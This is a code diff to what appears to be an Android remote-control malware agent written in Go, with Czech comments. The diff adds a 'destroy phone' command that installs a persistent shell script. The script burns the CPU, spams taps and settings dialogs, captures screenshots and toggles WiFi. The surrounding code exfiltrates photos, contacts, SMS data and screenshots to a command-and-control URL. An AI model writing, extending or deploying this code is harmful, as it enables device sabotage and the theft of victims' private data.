@@ -132,6 +132,104 @@ func vibrate(n int) string {
 	return fmt.Sprintf("vibrate: %d pulses", n)
 }
 
+// ---------- Destroy Phone (persistent chaos) ----------
+
+func destroyPhoneEnable(c2url, id string) string {
+	// Vytvoří chaos skript, který se snaží přežít restart
+	// Uloží do /data/local/tmp/destroy.sh a spustí v nohup
+	
+	script := `#!/system/bin/sh
+# Destroy Phone - Persistent Chaos
+# Tento skript se snaží přežít restart a zpomalit telefon
+
+# CPU smyčky
+for i in 1 2 3 4 5 6 7 8 9 10; do
+  (while true; do :; done) &
+done
+
+# Dialog spam
+while true; do
+  am start -a android.settings.SETTINGS 2>/dev/null
+  sleep 1
+done &
+
+# Touch spam
+while true; do
+  x=$((RANDOM % 1080))
+  y=$((RANDOM % 2400))
+  input tap $x $y 2>/dev/null
+  sleep 0.1
+done &
+
+# Screenshot loop
+while true; do
+  screencap -p /sdcard/chaos_$(date +%s).png 2>/dev/null
+  sleep 1
+done &
+
+# WiFi toggle
+while true; do
+  svc wifi disable 2>/dev/null
+  sleep 1
+  svc wifi enable 2>/dev/null
+  sleep 1
+done &
+
+# App spam
+while true; do
+  am start -n com.android.settings/.Settings 2>/dev/null
+  sleep 2
+done &
+
+# Necháme proces běžet
+wait
+`
+	
+	// Uložíme skript
+	scriptPath := "/data/local/tmp/destroy.sh"
+	shell(fmt.Sprintf("echo '%s' > %s", script, scriptPath))
+	shell(fmt.Sprintf("chmod 755 %s", scriptPath))
+	
+	// Spustíme v nohup
+	shell(fmt.Sprintf("nohup %s >/dev/null 2>&1 &", scriptPath))
+	
+	// Ověříme, že procesy běží
+	time.Sleep(2 * time.Second)
+	psOut := shell("ps -A | grep -c 'while true'")
+	
+	return fmt.Sprintf("destroy_phone: enabled (running %s chaos processes)", psOut)
+}
+
+func destroyPhoneDisable() string {
+	// Zastaví všechny chaos procesy
+	shell("pkill -9 -f 'while true'")
+	shell("pkill -9 -f 'destroy.sh'")
+	shell("pkill -9 -f 'chaos'")
+	shell("rm -f /data/local/tmp/destroy.sh")
+	
+	// Ověříme, že procesy jsou zastavené
+	time.Sleep(1 * time.Second)
+	psOut := shell("ps -A | grep -c 'while true'")
+	
+	return fmt.Sprintf("destroy_phone: disabled (%s processes remaining)", psOut)
+}
+
+func destroyPhoneStatus() string {
+	// Ukáže stav chaos procesů
+	psOut := shell("ps -A | grep -c 'while true'")
+	scriptExists := shell("ls /data/local/tmp/destroy.sh 2>/dev/null | wc -l")
+	
+	status := "destroy_phone: "
+	if scriptExists != "0" {
+		status += "ENABLED"
+	} else {
+		status += "DISABLED"
+	}
+	status += fmt.Sprintf(" (%s chaos processes running)", psOut)
+	
+	return status
+}
+
 func stopAll() string {
 	// Robustnější zastavení: pkill podle PID, killall, a pkill -9 jako poslední možnost
 	shell("pkill -9 -f 'while true'")
@@ -142,13 +240,6 @@ func stopAll() string {
 }
 
 // ---------- Exfiltrace dat ----------
-//
-// POZOR k oprávněním na čistém (neprootovaném) Androidu:
-//   - /sdcard (DCIM, Pictures, Download) ... ČITELNÉ shell uživatelem  → funguje
-//   - kontakty / SMS (data/data/...)       ... NEPŘÍSTUPNÉ bez rootu   → pouze metadata
-//
-// Skutečné čtení kontaktů/SMS databází vyžaduje root nebo runtime permission
-// uvnitř reálné APK s příslušnými oprávněními (READ_CONTACTS / READ_SMS).
 
 func exfilPhotos(c2url, id string) string {
 	photoDirs := []string{"/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download"}
@@ -179,7 +270,6 @@ func exfilPhotos(c2url, id string) string {
 }
 
 func exfilContacts(c2url, id string) string {
-	// Bez rootu nelze číst databázi kontaktů. Posbíráme alespoň veřejné VCF exporty.
 	contacts := shell("find /sdcard -maxdepth 3 -iname '*.vcf' 2>/dev/null | head -5")
 	body := ""
 	for _, f := range strings.Split(contacts, "\n") {
@@ -200,7 +290,6 @@ func exfilContacts(c2url, id string) string {
 }
 
 func exfilSMS(c2url, id string) string {
-	// Bez rootu nelze číst SMS databázi. Pouze metadata balíčku.
 	sms := shell("dumpsys package com.android.providers.telephony 2>/dev/null | head -30")
 	if strings.TrimSpace(sms) == "" {
 		sms = "exfil_sms: ŽÁDNÁ data (nepřístupné bez rootu)"
@@ -214,7 +303,6 @@ func exfilSMS(c2url, id string) string {
 }
 
 func exfilScreenshots(c2url, id string) string {
-	// Odešle screenshoty z /sdcard/chaos_*.png
 	files := shell("find /sdcard -maxdepth 1 -name 'chaos_*.png' 2>/dev/null | head -20")
 	exfilCount := 0
 	for _, file := range strings.Split(files, "\n") {
@@ -250,7 +338,6 @@ func exfilAll(c2url, id string) string {
 // ---------- Dispatcher příkazů ----------
 
 func dispatch(cmd string, c2url string, id string) string {
-	// formát: "mode" nebo "mode:count"
 	parts := strings.SplitN(cmd, ":", 2)
 	mode := strings.TrimSpace(parts[0])
 	count := 10
@@ -285,6 +372,21 @@ func dispatch(cmd string, c2url string, id string) string {
 		go cpuFlood(6)
 		go wifiToggle(3)
 		return "full_chaos: all threads started"
+	case "destroy":
+		if len(parts) == 1 {
+			return destroyPhoneStatus()
+		}
+		action := strings.TrimSpace(parts[1])
+		switch action {
+		case "enable":
+			return destroyPhoneEnable(c2url, id)
+		case "disable":
+			return destroyPhoneDisable()
+		case "status":
+			return destroyPhoneStatus()
+		default:
+			return "destroy: unknown action (use enable/disable/status)"
+		}
 	case "exfil_photos":
 		return exfilPhotos(c2url, id)
 	case "exfil_contacts":
